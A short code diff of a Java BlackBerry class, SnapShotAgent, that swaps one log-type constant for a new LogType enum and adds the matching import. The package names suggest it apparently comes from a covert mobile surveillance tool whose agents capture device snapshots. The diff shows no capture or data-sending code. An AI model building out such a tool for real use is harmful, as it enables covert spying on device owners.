@@ -11,6 +11,7 @@ import net.rim.device.api.util.DataBuffer;
 import com.ht.rcs.blackberry.fs.AutoFlashFile;
 import com.ht.rcs.blackberry.fs.Path;
 import com.ht.rcs.blackberry.log.Log;
+import com.ht.rcs.blackberry.log.LogType;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
@@ -28,7 +29,7 @@ public class SnapShotAgent extends Agent {
 
     public SnapShotAgent(boolean agentStatus) {
         super(Agent.AGENT_SNAPSHOT, agentStatus, true);
-        Check.asserts(Log.convertTypeLog(this.agentId) == Log.LOGTYPE_SNAPSHOT,
+        Check.asserts(Log.convertTypeLog(this.agentId) == LogType.SNAPSHOT,
                 "Wrong Conversion");
     }
 
